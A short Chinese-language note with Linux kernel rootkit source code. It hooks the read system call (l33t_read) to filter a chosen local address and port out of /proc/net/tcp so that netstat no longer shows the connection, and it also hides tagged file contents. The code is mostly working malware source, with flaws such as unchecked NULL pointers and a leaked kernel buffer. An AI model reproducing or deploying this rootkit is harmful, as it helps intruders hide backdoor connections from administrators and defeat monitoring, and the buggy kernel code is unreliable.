端口隐藏，netstat -nat查看/proc/net/tcp这个文件列出的连接，在read中把连接信息过滤掉

read函数从fd指向的文件中读取count个字节的数据。
函数原型：
#include<unistd.h>
ssize_t read(int fd, void *buf, size_t count); 
参数说明：
   int fd : 文件描述符，指向要读取数据的文件
  void *buf : 用于存放读取的数据的缓存开始地址
  size_t count : 读取到缓冲区的字节数


char *hide_connection = "0101007F:0035";//隐藏的连接，地址：端口号
char *next_connection = "0100007F:0277";

int hide_conn(void *arg, ssize_t size){
//
	char *p[5];
	char *buf, *p1, *p2;
	int i, newret;

	buf = (char *) kmalloc(size, GFP_KERNEL);
	if(!buf) return(-1);

	if(copy_from_user((void *) buf, (void *) arg, size)) {
		kfree(buf);
		return size;
	}

	p1 = strstr(buf, hide_connection);
	p2 = strstr(buf, next_connection);
	int off = p2-p1;

	i = size - (p1 - buf + off);
	memmove((void *) p1, (void *) (p1 + off), i);//将下一个连接地址复制到目标连接的位置，即过滤掉目标连接
	newret = size - off;//新的缓存大小

	if(copy_to_user((void *) arg, (void *) buf, newret)) {
		kfree(buf);
		return size;
	}

	return newret;

//
}


asmlinkage ssize_t l33t_read(unsigned int fd, char __user *buf, size_t count) {
	struct file *f;
	int fput_needed;
	ssize_t ret;
       
	if(hide_file_content) {
		ret = -EBADF;

		atomic_set(&read_on, 1);
		f = e_fget_light(fd, &fput_needed);

		if (f) {
#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 0)
			ret = vfs_read(f, buf, count, &f->f_pos);
#else
			ret = vfs_read_addr(f, buf, count, &f->f_pos);
#endif			
			if(f_check(buf, ret) == 1) ret = hide_content(buf, ret);

			if(f_check(buf, ret) == 2) ret = hide_conn(buf, ret);//f_check找到目标连接时返回2，过滤掉隐藏信息
	    	
			fput_light(f, fput_needed);
		}
		atomic_set(&read_on, 0);
	} else {
		ret = o_read(fd, buf, count);
	}

	return ret;
}

int f_check(void *arg, ssize_t size) {
	char *buf;

	if ((size <= 0) || (size >= SSIZE_MAX)) return(-1);

	buf = (char *) kmalloc(size+1, GFP_KERNEL);
	if(!buf) return(-1);

	if(copy_from_user((void *) buf, (void *) arg, size)) goto out;

	buf[size] = 0;

	if ((strstr(buf, HIDETAGIN) != NULL) && (strstr(buf, HIDETAGOUT) != NULL)) {
		kfree(buf);
		return(1);
	}
//
	if ((strstr(buf, "local_address") !=NULL) && (strstr(buf, "0101007F")!= NULL)) {		
		kfree(buf);
		return(2);
	}
out:
	kfree(buf);
	return(-1);
}
